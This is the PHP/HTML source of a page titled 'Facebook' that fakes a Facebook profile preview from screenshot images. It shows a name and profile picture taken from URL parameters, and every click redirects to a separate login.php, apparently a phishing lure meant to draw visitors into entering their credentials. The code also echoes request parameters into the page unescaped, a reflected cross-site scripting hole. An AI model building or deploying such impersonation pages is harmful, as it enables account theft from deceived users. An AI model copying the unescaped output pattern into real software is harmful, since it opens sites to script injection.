<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
</head>
<body>

    <div class="menu">
        <img class="menuImage" src="images/menu.jpg" onclick="login();">
    </div>

    <img class="menuImage" src="images/menuFiller.jpg" onclick="login();">

    <div class="login">
        <div class="hline"></div>
        <?php
            if(empty($_REQUEST['name']) == false){
                global $name;
                $name = $_REQUEST['name'];
            }
            echo "<p class=\"mainFont\">$name is on Facebook. To connect with $name, join Facebook today.</p>";
        ?>
        <img id="join" src="images/join.jpg" onclick="login();">
        <p id="divide" class="mainFont">______________ or ______________</p>
        <img id="login" src="images/login.jpg" onclick="login();">
        <p></p>
        <div class="hline"></div>
    </div>
    


    <?php
        if(empty($_REQUEST['image']) == false){
            global $image;
            $image = $_REQUEST['image'];
        }
    ?>

    <div class="whiteBackground">
    <?php 
        echo "<img id=\"profilePicture\" src=\"$image\" onclick=\"login();\">";
        echo "<p class=\"mainFont\" id=\"fullName\">$name</p>";
    ?>
    </div>

    <img class="fullWidthImage" src="images/options.jpg" onclick="login();">

    <img class="fullWidthImage" src="images/photos.jpg" onclick="login();">

    <div class="whiteBackground">
        <img id="copyright" class="fullWidthImage" src="images/copyright.jpg" onclick="login();">
    </div>

    <script>
        function login() {
            window.location.href = "./login.php";
        }
    </script>

    <style>
        body, html
        {
            background-color: rgb(233,234,235);
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        .menu
        {
            position: fixed;
            max-height: 36pt;
            width: 100%;
            background-color: rgb(66,88,146);
        }

        .menuImage
        {
            display: block;
            margin-left: auto;
            margin-right: auto;
            max-height: 36pt;
        }

        .login
        {
            background-color: rgb(244,244,244);
            margin-top: 0;
            padding-right: 0;
        }

        .mainFont
        {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            font-size: 13pt;
            margin-left: 10%;
            width: 80%;
            color: rgb(25,25,25);
        }

        .fullWidthImage
        {
            width: 100%;
            max-width: 600pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .hline {
            border-top: 1px  solid rgb(160,160,160);
            width: 100%;
            align-self: center;
        }

        #join
        {
            max-height: 24pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        #divide
        {
            font-size: small;
            margin-top: 0;
            color: rgb(110,110,110);
        }

        #login
        {
            max-height: 24pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        #profilePicture
        {
            width: 35%;
            max-width: 200pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
            padding-top: 20pt;
            padding-bottom: 10pt;
        }

        .whiteBackground
        {
            width: 100%;
            max-width: 600pt;
            display: block;
            margin-left: auto;
            margin-right: auto;
            background-color: white;
        }

        #fullName
        {
            margin-top: 0;
            font-size: 24pt;
            background-color: white;
            display: block;
            width: 100%;
            max-width: 600pt;
            margin-left: auto;
            margin-right: auto;
            height: 40pt;
        }

        #copyright
        {
            padding-top: 40pt;
            padding-bottom: 40pt;
            max-width: 300pt;
        }
    </style>
    
</body>
</html>